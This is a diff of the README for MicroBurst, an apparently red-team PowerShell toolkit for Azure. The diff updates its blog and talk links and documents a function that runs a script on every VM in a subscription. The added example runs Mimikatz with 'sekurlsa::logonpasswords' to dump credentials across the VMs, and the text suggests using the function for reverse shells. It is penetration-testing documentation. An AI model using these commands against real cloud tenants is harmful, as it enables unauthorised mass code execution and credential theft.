@@ -29,14 +29,16 @@ MicroBurst includes functions and scripts that support Azure Services discovery,
 ### Importing the Module
 	Import-Module .\MicroBurst.psm1
 
-### Blogs / Presentations
+### Blogs
 * Anonymously Enumerating Azure Services - https://blog.netspi.com/enumerating-azure-services/
 * Anonymously Enumerating Azure File Resources - https://blog.netspi.com/anonymously-enumerating-azure-file-resources/
 * Get-AzurePasswords: A Tool for Dumping Credentials from Azure Subscriptions - https://blog.netspi.com/get-azurepasswords/
 * Utilizing Azure Services for Red Team Engagements - https://blog.netspi.com/utiilzing-azure-for-red-team-engagements/
-
+* Running PowerShell on Azure VMs at Scale - https://blog.netspi.com/running-powershell-scripts-on-azure-vms
+### Presentations
 * Attacking Azure Environments with PowerShell - DerbyCon2018 - https://www.youtube.com/watch?v=IdORwgxDpkw
 * DerbyCon2018 Slides - https://www.slideshare.net/kfosaaen/derbycon-8-attacking-azure-environments-with-powershell
+* BSidesPDX Slides - https://www.slideshare.net/kfosaaen/bsides-portland-attacking-azure-environments-with-powershell
 	
 ### Functions Information
 # Get-AzurePasswords.ps1
@@ -267,3 +269,42 @@ DESCRIPTION: The function will dump available information for an Office365 domai
     VERBOSE: 134 service principals were enumerated.
     VERBOSE: All done.
 	
+# Invoke-AzureRmVMBulkCMD.ps1
+PS C:\> Import-Module .\Get-MSOLDomainInfo.ps1
+
+PS C:\> Get-Help Invoke-AzureRmVMBulkCMD
+
+NAME: Invoke-AzureRmVMBulkCMD
+
+SYNOPSIS: Runs a Powershell script against all (or select) VMs in a subscription/resource group/etc.
+
+SYNTAX: Invoke-AzureRmVMBulkCMD [[-Subscription] <String[]>] [[-ResourceGroupName] <String[]>] [[-Name] <String[]>] [-Script] <String> [[-output] <String>] [<CommonParameters>]
+
+DESCRIPTION: This function will run a PowerShell script on all (or a list of) VMs in a subscription/resource group/etc. This can be handy for creating reverse shells, running Mimikatz, or doing practical automation of work.
+    
+    -------------------------- EXAMPLE 1 --------------------------
+    
+    PS C:\MicroBurst>Invoke-AzureRmVMBulkCMD -Verbose -Script .\Mimikatz.ps1
+    
+    Executing C:\MicroBurst\Mimikatz.ps1 against all (1) VMs in the Testing-Resources Subscription
+    Are you Sure You Want To Proceed: (Y/n): 
+    VERBOSE: Running .\Mimikatz.ps1 on the Remote-West - (10.2.0.5 : 40.112.160.13) virtual machine (1 of 1)
+    VERBOSE: Script Status: Succeeded
+    Script Output: 
+      .#####.   mimikatz 2.0 alpha (x64) release "Kiwi en C" (Feb 16 2015 22:15:28)
+     .## ^ ##.  
+     ## / \ ##  /* * *
+     ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+     '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
+      '#####'                                     with 15 modules * * */
+    
+    
+    mimikatz(powershell) # sekurlsa::logonpasswords
+    [Truncated]
+    mimikatz(powershell) # exit
+    Bye!
+    
+    VERBOSE: Script Execution Completed on Remote-West - (10.2.0.5 : 40.112.160.13)
+    VERBOSE: Script Execution Completed in 37 seconds
+
+RELATED LINKS: https://blog.netspi.com/running-powershell-scripts-on-azure-vms
